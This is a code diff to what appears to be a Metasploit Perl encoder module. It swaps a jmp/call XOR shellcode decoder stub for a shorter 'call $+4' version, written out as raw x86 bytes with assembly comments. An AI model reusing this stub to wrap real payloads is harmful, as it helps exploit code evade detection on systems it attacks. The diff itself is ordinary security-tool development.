@@ -11,12 +11,13 @@ package Msf::Encoder::Pex;
 use strict;
 use base 'Msf::Encoder::XorDword';
 use Pex::Encoder;
+use Pex::x86;
 
 my $advanced = {
 };
 
 my $info = {
-  'Name'    => 'Pex Jmp/Call Double Word Xor Encoder',
+  'Name'    => 'Pex Call $+4 Double Word Xor Encoder',
   'Version' => '$Revision$',
   'Authors' =>
     [
@@ -25,7 +26,7 @@ my $info = {
     ],
   'Arch'    => [ 'x86' ],
   'OS'      => [ ],
-  'Description'  =>  'Dynamically generated dword xor encoder (jmp/call)',
+  'Description'  =>  'Dynamically generated dword xor encoder',
   'Refs'    => [ ],
 };
 
@@ -41,39 +42,17 @@ sub _GenEncoder {
   my $xor = shift;
   my $len = shift;
   my $xorkey = pack('V', $xor);
-  my $l = Pex::Encoder::PackLength($len);
 
-  # spoon's smaller variable-length encoder
-  my $decoder;
-  if($l->{'negSmall'}) {
-    # 26 bytes
-    $decoder =
-      "\xeb\x13".                         # jmp SHORT 0x15 (xor_end)
-      "\x5e".                             # xor_begin: pop esi
-      "\x31\xc9".                         # xor ecx,ecx
-      "\x83\xe9". $l->{'negLengthByte'} . # sub ecx, BYTE -xorlen
-      "\x81\x36". $xorkey .               # xor_xor: xor DWORD [esi],xorkey
-      "\x83\xee\xfc".                     # sub $esi,-4
-      "\xe2\xf5".                         # loop 0x8 (xor_xor)
-      "\xeb\x05".                         # jmp SHORT 0x1a (xor_done)
-      "\xe8\xe8\xff\xff\xff";             # xor_end: call 0x2 (xor_begin)
-                                          # xor_done:
-  }
-  else {
-    # 29 bytes
-    $decoder =
-      "\xeb\x16".                         # jmp SHORT 0x18 (xor_end)
-      "\x5e".                             # xor_begin: pop esi
-      "\x31\xc9".                         # xor ecx,ecx
-      "\x81\xe9". $l->{'negLength'} .     # sub ecx, -xorlen
-      "\x81\x36". $xorkey .               # xor_xor: xor DWORD [esi],xorkey
-      "\x83\xee\xfc".                     # sub $esi,-4
-      "\xe2\xf5".                         # loop 0xb (xor_xor)
-      "\xeb\x05".                         # jmp SHORT 0x1d (xor_done)
-      "\xe8\xe5\xff\xff\xff";             # xor_end: call 0x2 (xor_begin)
-                                          # xor_done:
-  }
-
+  # spoon's smaller variable-length encoder (updated to use call $+4 by vlad902)
+  my $decoder =
+    Pex::x86::sub(-((($len -1) / 4) + 1), "ecx").
+    "\xe8\xff\xff\xff".			# call $+4
+    "\xff\xc0".				# inc eax
+    "\x5e".				# pop esi
+    "\x81\x76\x0e" . $xorkey.		# xor_xor: xor [esi + 0x0e], $xorkey 
+    "\x83\xee\xfc".			# sub esi, -4
+    "\xe2\xf4";				# loop xor_xor
+    
   return($decoder);
 }
 
